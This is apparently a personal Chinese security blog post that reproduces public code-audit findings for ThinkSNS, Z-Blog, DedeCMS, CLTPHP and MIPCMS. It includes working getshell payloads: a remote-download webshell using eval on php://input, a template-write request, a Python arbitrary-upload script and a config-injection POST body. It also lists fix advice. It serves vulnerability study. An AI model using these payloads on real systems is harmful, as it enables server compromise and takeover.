---
title: 代码审计漏洞复现学习
date: 2018-03-06 13:20:46
tags:
		- 
categories:
		- 代码审计

---

学习并复现一些公开的代码审计文章。

<!-- more -->




20180306

#### 20180308 [ThinkSNS_V4 任意文件下载漏洞导致Getshell](https://www.t00ls.net/thread-44505-1-1.html)

[源码下载](http://www.thinksns.com/experience.html)

存在漏洞代码`\ts4\apps\admin\Lib\Action\UpgradeAction.class.php`中的一个函数中。

	public function step1()
    {
        $downUrl = $_GET['upurl'];
        $downUrl = urldecode($downUrl);
        $path = DATA_PATH.'/'.'upgrade/'.basename($downUrl);

        // # 备份老配置文件
        $oldConf = file_get_contents(CONF_PATH.'/thinksns.conf.php');
        file_put_contents(DATA_PATH.'/old.thinksns.conf.php', $oldConf);

        // # 下载增量包
        is_dir(dirname($path)) or mkdir(dirname($path), 0777, true);
        file_put_contents($path, file_get_contents($downUrl));
        file_exists($path) or $this->showError('下载升级包失败，请检查'.dirname($path).'目录是否可写，如果可写，请刷新重试！');

        // 验证hash判断包是否合法。
        $filename = dirname($path).'/upgrade.json';
        $data = file_get_contents($filename);
        $data = json_decode($data, false);
        if (md5_file($path) != $data->md5) {
            $this->showError('更新包校验失败，请重新执行升级.');
        }




函数

	file_put_contents — 将一个字符串写入文件
	file_get_contents — 将整个文件读入一个字符串


在这段函数中，先备份老配置文件，然后下载增量包，下载参数$downUrl未经过任何处理，直接下载到网站目录下，接着验证hash判断包是否合法，但是并没有删除下载的增量包，
导致程序在实现上存在任意文件下载漏洞，下载远程文件到网站目录下，攻击者可指定第三方url下载恶意脚本到网站目录，进一步触发恶意代码，控制网站服务器。
	
远程下载文件，在另一个服务器上创建door.php。

	<?php   
	echo "<?php";
	echo "eval(file_get_contents('php://input'));";  
	echo "?>";  
	?>  


远程下载 	

`http://127.0.0.1:8000/ts4/index.php?app=admin&mod=Upgrade&act=step1&upurl=http://192.168.86.194:8000/door.php`

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-6/64637983.jpg)

会在`ts4\data\upgrade`出现下载的`door.php`文件。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-6/64755240.jpg)

#### 20180307 [Z-Blog_1.5.1.1740_bugs](https://github.com/ponyma233/cms/blob/master/Z-Blog_1.5.1.1740_bugs.md#web-site-physical-path-leakage)

在登录后台中，存在存储型`XSS`。

网站设置中。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-7/94288863.jpg)

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-7/85254114.jpg)

网站标题和网站副标题中均存在`XSS`漏洞。

`ZC_BLOG_SUBNAME`和`ZC_BLOG_NAME`参数。

通过抓包来看具体的请求参数以及相应的文件。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-7/44092416.jpg)

`/zb_system/cmd.php?act=SettingSav`

报错，泄漏网站物理路径。

`/zb_users/cache/compiled/default/module-previous.php`

#### 20180308 [DedeCMS V5.7 SP2后台存在代码执行漏洞](http://www.freebuf.com/vuls/164035.html)

[某CMS V5.7 SP2 后台Getshell](https://xianzhi.aliyun.com/forum/topic/2071)

[DedeCMS V5.7 SP2后台存在代码执行漏洞](http://www.freebuf.com/vuls/164035.html)



[下载](http://www.dedecms.com/products/dedecms/downloads/)

##### 漏洞详情

默认后台地址 `/dede/`，文件`dede/tpl.php`中的251到281行。


	csrf_check();
		#filename和前面正则的匹配情况
	    if(!preg_match("#^[a-z0-9_-]{1,}\.lib\.php$#i", $filename))
	    {
	        ShowMsg('文件名不合法，不允许进行操作！', '-1');
	        exit();
	    }
	    require_once(DEDEINC.'/oxwindow.class.php');
		#搜索filename中匹配`\.lib\.php$#i`的部分，以空格代替
	    $tagname = preg_replace("#\.lib\.php$#i", "", $filename);
		#去掉反斜号
	    $content = stripslashes($content);
		#拼接文件名
	    $truefile = DEDEINC.'/taglib/'.$filename;
		#写入内容
	    $fp = fopen($truefile, 'w');
	    fwrite($fp, $content);
	    fclose($fp);

replace处理之后赋值给变量 $tagname 。但是写入文件的时候并没有用到$tagname 。
那为什么有这个$tagname，拼接文件名的时候，应该是拼接`tagname`

利用

	1.由于dedecms全局变量注册的特性，所以这里的content变量和filename变量可控。

	2.可以看到将content直接写入到文件中导致可以getshell。但是这里的文件名经过正则表达式，所以必须要.lib.php结尾。

	3.这里还有一个csrf_check()函数，即请求中必须要带token参数。


##### 漏洞利用

1. 首先获取`token`。访问域名 + `/dede/tpl.php?action=upload`

	view-source:http://127.0.0.1:8000/DedeCMS/uploads/dede/tpl.php?action=upload

	d170f6bed3360da62d909d28a072c312



![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-8/56295937.jpg)

2.然后访问 

	域名 + /dede/tpl.php?filename=secnote.lib.php&action=savetagfile&content=%3C?php%20phpinfo();?%3E&token=[你的token值



![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-8/16267803.jpg)

shell 地址

	域名 + /include/taglib/secnote.lib.php

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-8/81830140.jpg)

##### 漏洞修复

1.禁止此处写入文件。

2.过滤恶意标签

#### [20180319【代码审计】CLTPHP_v5.5.3 任意文件上传漏洞](https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=301419949&idx=1&sn=0a4ab4f3c69e22aba6a69a09bcbfe009&chksm=0b55ddf03c2254e6982bd0b8fca4b410462781b3435acf837ba622888aa1cd62631736f3660c&mpshare=1&scene=23&srcid=0318lckYIwNLZKInw7H18N4w#rd)

首先把数据库文件到近数据库中，就可以直接进行访问了。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-19/37934014.jpg)

##### 漏洞分析

	1、漏洞文件位置：`/app/user/controller/UpFiles.php` 第5-25行：

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-19/20386060.jpg)


这段代码是一个上传函数，未经用户权限验证，获取表单内容，存在权限绕过上传的情况。跟踪`move`函数：

2：在文件`\think\library\think\File.php`中，第327-377行，这是一个移动文件函数。经过一系列检测上传文件，看其中的`check`验证上传函数。

	 public function move($path, $savename = true, $replace = true)
	    {
	        // 文件上传失败，捕获错误代码
	        if (!empty($this->info['error'])) {
	            $this->error($this->info['error']);
	            return false;
	        }
	
	        // 检测合法性
	        if (!$this->isValid()) {
	            $this->error = 'upload illegal files';
	            return false;
	        }
	
	        // 验证上传
	        if (!$this->check()) {
	            return false;
	        }
	
	        $path = rtrim($path, DS) . DS;
	        // 文件保存命名规则
	        $saveName = $this->buildSaveName($savename);
	        $filename = $path . $saveName;
	
	        // 检测目录
	        if (false === $this->checkPath(dirname($filename))) {
	            return false;
	        }
	
	        // 不覆盖同名文件
	        if (!$replace && is_file($filename)) {
	            $this->error = ['has the same filename: {:filename}', ['filename' => $filename]];
	            return false;
	        }
	
	        /* 移动文件 */
	        if ($this->isTest) {
	            rename($this->filename, $filename);
	        } elseif (!move_uploaded_file($this->filename, $filename)) {
	            $this->error = 'upload write error';
	            return false;
	        }
	
	        // 返回 File 对象实例
	        $file = new self($filename);
	        $file->setSaveName($saveName)->setUploadInfo($this->info);
	
	        return $file;
	    }

3:在文件`\think\library\think\File.php`中。第216-245行。

	public function check($rule = [])
	    {
	        $rule = $rule ?: $this->validate;
	
	        /* 检查文件大小 */
	        if (isset($rule['size']) && !$this->checkSize($rule['size'])) {
	            $this->error = 'filesize not match';
	            return false;
	        }
	
	        /* 检查文件 Mime 类型 */
	        if (isset($rule['type']) && !$this->checkMime($rule['type'])) {
	            $this->error = 'mimetype to upload is not allowed';
	            return false;
	        }
	
	        /* 检查文件后缀 */
	        if (isset($rule['ext']) && !$this->checkExt($rule['ext'])) {
	            $this->error = 'extensions to upload is not allowed';
	            return false;
	        }
	
	        /* 检查图像文件 */
	        if (!$this->checkImg()) {
	            $this->error = 'illegal image files';
	            return false;
	        }
	
	        return true;
	    }

在check函数中检查文件大小、Mime类型、文件后缀等，主要是从数组$rule中获取，check函数未带入参数$rule，所以取$this->validate,而validate的值在该类有定义，我们看一下$validate的值。

在文件`\think\library\think\File.php`中的38-42行。

	 /**
	     * @var array 文件上传验证规则
	     */
	    protected $validate = [];

在同文件中validate默认值为空，调用ThinkPHP的上传函数，但配置不当导致过滤函数chenk无效，导致程序在实现存在任意文件上传漏洞，攻击者无需任何权限，可直接上传恶意脚本，控制网站服务器权限。

##### 漏洞利用

	#!/usr/bin/python
	# Bypass
	
	import requests
	import sys
	
	def cltphp_up(url):
	    header = { 'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)','X-Requested-With': 'XMLHttpRequest',}   
	    geturl = url +"/user/upFiles/upload"
	    files = {'file':('1.php',open('1.php','rb'),'image/peg')}
	    res = requests.post(geturl,files=files,headers=header)
	    print res.text
	    
	if __name__ == "__main__":
	    if len(sys.argv) == 2:
	        url = sys.argv[1]
	        cltphp_up(url)
	        sys.exit(0)
	    else:
	        print("usage: %s www.abc.com" % sys.argv[0])
	        sys.exit(-1)

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-19/88597949.jpg)


访问`http://127.0.0.1:8000/cltphp/public/uploads/20180319/e6c63118ba063b9f97f1e931622582ab.php`

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-19/31223165.jpg)

##### 修复建议

1、添加上传页面的认证，通过白名单限制上传文件后缀；

2、禁止上传目录脚本执行权限。

#### [20180322 MIPCMS 远程写入配置文件Getshell](https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=301419963&idx=1&sn=0cb82aa5629b6432415c93d9f2b8eb8c&chksm=0b55dde63c2254f04399a7afa7f49a3889e8eaa37d747ec1a1b70f00cc0bf94c764db1295a11&mpshare=1&scene=23&srcid=0321pbJgBla01aN1U5GZXNlG#rd)

##### 代码分析

1. 漏洞文件位置:`\app\install\controller\Install.php`的第13-23行：

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-22/23851406.jpg)

在`index`函数中，检测是否存在`install.lock`文件，判断网站是否已经安装。检测是在`index`函数中，非初始化函数中，固在接下来的安装过程中，如果没有检测到`lock`文件，那么就存在一个绕过情况，进行`CMS`重装。

同文件下的函数，第118-142行。

	 public function installPost(Request $request) {
	                header('Access-Control-Allow-Origin: *');
	                header('Access-Control-Allow-Credentials: true');
	                header('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');
	                header('Access-Control-Allow-Headers: Content-Type, Content-Range,access-token, secret-key,access-key,uid,sid,terminal,X-File-Name,Content-Disposition, Content-Description');
	            if (Request::instance()->isPost()) {
	                $dbconfig['type']="mysql";
	                $dbconfig['hostname']=input('post.dbhost');
	                $dbconfig['username']=input('post.dbuser');
	                $dbconfig['password']=input('post.dbpw');
	                $dbconfig['hostport']=input('post.dbport');
	                $dbname=strtolower(input('post.dbname'));
	                
	                $username = input('post.username');
	                $password = input('post.password');
	                $rpassword = input('post.rpassword');
	                if (!$username) {
	                    return jsonError('请输入用户名');
	                }
	                if (!$password) {
	                    return jsonError('请输入密码');
	                }
	                if (!$rpassword) {
	                    return jsonError('请输入重复密码');
	                }


直接跳转到这一步，绕过index函数中`install.lock`的检测。看到，这段`installPost`函数中获取了多个参数，并没有检测`lock`文件。看下面的代码：

	 $dsn = "mysql:dbname={$dbname};host={$dbconfig['hostname']};port={$dbconfig['hostport']};charset=utf8";
	                try {
	                    $db = new \PDO($dsn, $dbconfig['username'], $dbconfig['password']);
	                } catch (\PDOException $e) {
	                    return jsonError('错误代码:'.$e->getMessage());
	                }
	                $dbconfig['database'] = $dbname;
	                $dbconfig['prefix']=trim(input('dbprefix'));
	                $tablepre = input("dbprefix");
	                $sql = file_get_contents(PUBLIC_PATH.'package'.DS.'mipcms_v_3_1_0.sql');
	                $sql = str_replace("\r", "\n", $sql);
	                $sql = explode(";\n", $sql);
	                $default_tablepre = "mip_";
	                $sql = str_replace(" `{$default_tablepre}", " `{$tablepre}", $sql);
	                foreach ($sql as $item) {
	                    $item = trim($item);
	                    if(empty($item)) continue;
	                    preg_match('/CREATE TABLE `([^ ]*)`/', $item, $matches);
	                    if($matches) {
	                        if(false !== $db->exec($item)){
	
	                        } else {
	                           return jsonError('安装失败');
	                        }
	                    } else {
	                        $db->exec($item);
	                    }
	                }

这段函数对获取的参数进行检测，Mysql数据库连接失败会报错退出，接着进行导入数据库操作。看第172-192行。

	if(is_array($dbconfig)){
	                    $conf = file_get_contents(PUBLIC_PATH.'package'.DS.'database.php');
	                    foreach ($dbconfig as $key => $value) {
	                        $conf = str_replace("#{$key}#", $value, $conf);
	                    }
	                    $install = CONF_PATH;
	                    if(!is_writable($install)){
	                        return jsonError('路径：'.$install.'没有写入权限');
	                    }
	                    try {
	                        $fileStatus = is_file(CONF_PATH. '/database.php');
	                        if ($fileStatus) {
	                             unlink(CONF_PATH. '/database.php');
	                        }
	                        file_put_contents(CONF_PATH. '/database.php', $conf);
	                        return jsonSuccess('配置文件写入成功',1);
	                    } catch (Exception $e) {
	                        return jsonError('database.php文件写入失败，请检查system/config 文件夹是否可写入');
	                    }


在`installPost`函数在的最后，将参数写入配置文件`database.php`中，且未对参数进行任何的过滤，攻击者可以构造脚本代码写入配置文件。

综上，首先程序流程不严谨，可以绕过install.lock检测进入installPost函数中，可直接进行CMS重装，或者通过构造参数将脚本代码写入配置文件，进一步去触发脚本代码，控制网站服务器，程序在实现上存在远程代码执行漏洞，危害极大。

##### 漏洞利用

###### CMS 重装

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-23/68963804.jpg)

###### 远程写入配置文件Getshell

利用php://input实现的webshell，就不必纠结于大小写了。

首先在攻击者服务器上创建一个新的数据库，命名为`test',1=>eval(file_get_contents('php://input')),'xx'=>'`

访问 `192.168.145.226/index.php?s=/install/Install/installPost`

`POST`内容

	username=admin&password=12345678&rpassword=12345678&dbport=3306&dbname=test',1=>eval(file_get_contents('php://input')),'xx'=>'&dbhost=192.168.86.194&dbuser=root&dbpw=root

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-23/97867487.jpg)

查看写入的内容。

	 // 数据库名
    'database'       => 'test',1=>eval(file_get_contents('php://input')),'xx'=>'',


测试。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-23/88598734.jpg)
